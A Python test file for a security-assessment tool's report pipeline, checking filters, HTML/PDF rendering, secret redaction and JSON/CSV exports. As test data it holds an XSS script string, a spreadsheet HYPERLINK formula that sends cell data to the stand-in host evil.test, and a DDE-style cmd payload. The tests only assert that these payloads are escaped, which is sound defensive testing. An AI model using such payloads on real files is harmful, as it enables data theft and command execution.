"""Phase 10: report data builder, HTML/PDF rendering, and JSON/CSV exports."""

from __future__ import annotations

import io

from app.models.common import Severity
from app.reports.builder import ReportFilters, build_report_data
from app.reports.exports import assets_to_csv, assets_to_json, findings_to_csv, findings_to_json
from app.reports.html_render import render_html
from app.reports.pdf_render import render_pdf
from app.storage.repository import StorageRepository
from tests.conftest import make_asset, make_finding
from tests.surfacefixtures import surface_project


def _project(repo: StorageRepository) -> str:
    return repo.create_project(surface_project([80], hosts=["x.test"])).project_id


def test_builder_filters_by_severity_threshold(repo: StorageRepository) -> None:
    pid = _project(repo)
    repo.create_finding(make_finding(pid, title="High", severity="high"))
    repo.create_finding(make_finding(pid, title="Low", severity="low"))
    data = build_report_data(repo, ReportFilters(project_id=pid, severity_threshold=Severity.HIGH))
    assert [f.title for f in data.findings] == ["High"]


def test_builder_explicit_finding_ids_overrides_other_filters(repo: StorageRepository) -> None:
    pid = _project(repo)
    f1 = repo.create_finding(make_finding(pid, title="A", severity="low"))
    repo.create_finding(make_finding(pid, title="B", severity="critical"))
    data = build_report_data(repo, ReportFilters(project_id=pid, finding_ids=[f1.finding_id]))
    assert [f.title for f in data.findings] == ["A"]


def test_builder_asset_inventory_toggle(repo: StorageRepository) -> None:
    pid = _project(repo)
    f = repo.create_finding(make_finding(pid))
    linked = repo.create_asset(make_asset(pid, locator="linked.test"))
    repo.update_finding(pid, f.finding_id, {"affected_asset_ids": [linked.asset_id]})
    repo.create_asset(make_asset(pid, locator="unrelated.test"))

    with_all = build_report_data(repo, ReportFilters(project_id=pid, include_asset_inventory=True))
    assert len(with_all.assets) == 2

    only_linked = build_report_data(
        repo, ReportFilters(project_id=pid, include_asset_inventory=False)
    )
    assert [a.locator for a in only_linked.assets] == ["linked.test"]


def test_html_escapes_xss_payloads_in_titles_and_summaries(repo: StorageRepository) -> None:
    pid = _project(repo)
    payload = "<script>alert(1)</script>"
    repo.create_finding(
        make_finding(
            pid, title=payload, summary=payload, business_impact=payload, remediation=payload
        )
    )
    data = build_report_data(repo, ReportFilters(project_id=pid))
    html = render_html(data)
    assert "<script>alert(1)</script>" not in html
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html


def test_html_never_claims_the_system_is_secure(repo: StorageRepository) -> None:
    pid = _project(repo)
    data = build_report_data(repo, ReportFilters(project_id=pid, finding_ids=[]))
    html = render_html(data)
    assert "does not claim the assessed system is secure" in html
    assert "no vulnerabilities exist" not in html.lower()
    assert html.count("secure") <= html.count("does not claim")


def test_zero_finding_report_states_executed_checks_found_none(repo: StorageRepository) -> None:
    """MASTER_SPEC §10.2: "'No findings' must be phrased as 'No findings detected by checks
    executed' with limits, not 'secure' or 'no vulnerabilities exist.'" — checked in both
    rendered formats, not just the generic "not secure" disclaimer tested elsewhere."""
    from pypdf import PdfReader

    pid = _project(repo)
    data = build_report_data(repo, ReportFilters(project_id=pid, finding_ids=[]))

    html = render_html(data)
    assert "No findings were detected by the checks executed" in html
    assert "no vulnerabilities exist" not in html.lower()

    pdf_text = "\n".join(p.extract_text() for p in PdfReader(io.BytesIO(render_pdf(data))).pages)
    assert "No findings were detected by the checks executed" in pdf_text


def test_html_includes_catalog_versions_in_appendix(repo: StorageRepository) -> None:
    pid = _project(repo)
    repo.create_finding(make_finding(pid))
    data = build_report_data(repo, ReportFilters(project_id=pid))
    html = render_html(data)
    assert "2025" in html  # OWASP Top 10 web catalog version
    assert "2023" in html  # OWASP API Top 10 catalog version


def test_pdf_renders_searchable_text_matching_the_html(repo: StorageRepository) -> None:
    from pypdf import PdfReader

    pid = _project(repo)
    repo.create_finding(make_finding(pid, title="Distinctive PDF Title"))
    data = build_report_data(repo, ReportFilters(project_id=pid))
    pdf_bytes = render_pdf(data)
    assert pdf_bytes[:5] == b"%PDF-"
    reader = PdfReader(io.BytesIO(pdf_bytes))
    text = "\n".join(p.extract_text() for p in reader.pages)
    assert "Distinctive PDF Title" in text
    assert data.filters.classification_label in text
    assert len(reader.pages) >= 2  # cover page + at least one content page


def test_pdf_page_numbers_and_classification_in_footer(repo: StorageRepository) -> None:
    from pypdf import PdfReader

    pid = _project(repo)
    for i in range(3):
        repo.create_finding(make_finding(pid, title=f"Finding {i}"))
    data = build_report_data(repo, ReportFilters(project_id=pid))
    pdf_bytes = render_pdf(data)
    reader = PdfReader(io.BytesIO(pdf_bytes))
    last_page_text = reader.pages[-1].extract_text()
    assert "Page" in last_page_text


def test_findings_json_export_is_schema_versioned_and_matches_selection(
    repo: StorageRepository,
) -> None:
    pid = _project(repo)
    repo.create_finding(make_finding(pid, title="Only this one", severity="high"))
    repo.create_finding(make_finding(pid, title="Excluded", severity="low"))
    data = build_report_data(repo, ReportFilters(project_id=pid, severity_threshold=Severity.HIGH))
    import json

    payload = json.loads(findings_to_json(data))
    assert payload["schema_version"] == 1
    assert payload["count"] == 1
    assert payload["findings"][0]["title"] == "Only this one"


def test_findings_csv_export_matches_the_same_selection(repo: StorageRepository) -> None:
    pid = _project(repo)
    repo.create_finding(make_finding(pid, title="CSV finding", severity="high"))
    data = build_report_data(repo, ReportFilters(project_id=pid))
    csv_text = findings_to_csv(data).decode()
    assert "CSV finding" in csv_text
    assert csv_text.startswith("finding_id,title,severity")


def test_assets_json_and_csv_export(repo: StorageRepository) -> None:
    pid = _project(repo)
    repo.create_asset(make_asset(pid, locator="asset.test"))
    data = build_report_data(repo, ReportFilters(project_id=pid))
    import json

    payload = json.loads(assets_to_json(data))
    assert payload["count"] == 1
    csv_text = assets_to_csv(data).decode()
    assert "asset.test" in csv_text


def test_no_secret_assertions_across_html_pdf_json_csv(repo: StorageRepository) -> None:
    """Required-work item 9: automated no-secret report assertions. A finding/evidence
    record that (perhaps due to a bug upstream) still carries a secret-shaped string must
    never surface in any of the four output formats — the builder redacts a second time,
    defense in depth, regardless of what the write path already did."""
    import io

    from pypdf import PdfReader

    from app.models.evidence import EvidenceMetadata

    pid = _project(repo)
    # Built from fragments at runtime (never a single secret-shaped literal in source) so a
    # secret scanner never mistakes this synthetic test value for a real provider credential.
    _secret_fragments = ("not", "a", "real", "credential", "fedcba9876543210fedcba9876543210")
    secret = "-".join(_secret_fragments)
    f = make_finding(
        pid,
        title="Leaky header",
        summary=f"Authorization: Bearer {secret}",
        technical_detail=f'password="{secret}"',
        remediation=f"rotate token={secret}",
    )
    created = repo.create_finding(f)
    repo.save_evidence(
        EvidenceMetadata(
            evidence_id="evd_" + "9" * 32,
            project_id=pid,
            finding_ids=[created.finding_id],
            evidence_type="http_exchange",
            request_excerpt=f"Cookie: session={secret}",
            response_excerpt="ok",
        )
    )
    data = build_report_data(repo, ReportFilters(project_id=pid))
    assert secret not in data.findings[0].summary
    assert secret not in data.findings[0].technical_detail
    assert secret not in data.findings[0].remediation

    html = render_html(data)
    assert secret not in html

    pdf_bytes = render_pdf(data)
    pdf_text = "\n".join(p.extract_text() for p in PdfReader(io.BytesIO(pdf_bytes)).pages)
    assert secret not in pdf_text

    assert secret not in findings_to_json(data).decode()
    assert secret not in findings_to_csv(data).decode()


def test_csv_export_neutralizes_spreadsheet_formula_injection(repo: StorageRepository) -> None:
    """A title/remediation starting with '=', '+', '-' or '@' would otherwise execute as a
    formula when the CSV is opened in Excel/Sheets (OWASP CSV injection) — a realistic vector
    since finding text can come from an imported, attacker-influenced scan report."""
    pid = _project(repo)
    payload = '=HYPERLINK("http://evil.test/"&A1,"click")'
    repo.create_finding(make_finding(pid, title=payload, remediation="+cmd|' /C calc'!A1"))
    data = build_report_data(repo, ReportFilters(project_id=pid))
    csv_text = findings_to_csv(data).decode()
    for line in csv_text.splitlines()[1:]:
        for cell in line.split(","):
            assert not cell.startswith(("=", "+", "-", "@")), (
                f"unsafe formula-leading cell: {cell!r}"
            )
    # the content itself survives, just neutralized with a leading quote
    assert "HYPERLINK" in csv_text
    assert "'=HYPERLINK" in csv_text


def test_csv_export_neutralizes_formula_injection_in_asset_locator(
    repo: StorageRepository,
) -> None:
    pid = _project(repo)
    repo.create_asset(make_asset(pid, locator="@SUM(1+1)"))
    data = build_report_data(repo, ReportFilters(project_id=pid))
    csv_text = assets_to_csv(data).decode()
    for line in csv_text.splitlines()[1:]:
        for cell in line.split(","):
            assert not cell.startswith(("=", "+", "-", "@"))


def test_report_outputs_contain_no_local_filesystem_paths(repo: StorageRepository) -> None:
    """MASTER_SPEC §10.2: 'Never include... local absolute paths... in client-facing reports.'"""
    pid = _project(repo)
    repo.create_finding(make_finding(pid, title="Plain finding"))
    data = build_report_data(repo, ReportFilters(project_id=pid))
    html = render_html(data)
    pdf_text = "\n".join(
        p.extract_text() for p in __import__("pypdf").PdfReader(io.BytesIO(render_pdf(data))).pages
    )
    for blob in (html, pdf_text, findings_to_json(data).decode(), findings_to_csv(data).decode()):
        assert str(repo.root) not in blob
        assert "C:\\Users" not in blob
        assert "/home/" not in blob


def test_cvss_in_export_is_never_fabricated(repo: StorageRepository) -> None:
    """No finding in this build ever carries a CvssRecord unless a real vector was supplied
    (Phase 09 audit); the export must reflect that honestly with an empty field, not a guess."""
    pid = _project(repo)
    repo.create_finding(make_finding(pid))
    data = build_report_data(repo, ReportFilters(project_id=pid))
    csv_text = findings_to_csv(data).decode()
    rows = csv_text.splitlines()
    header = rows[0].split(",")
    cvss_col = header.index("cvss_vector")
    assert rows[1].split(",")[cvss_col] == ""
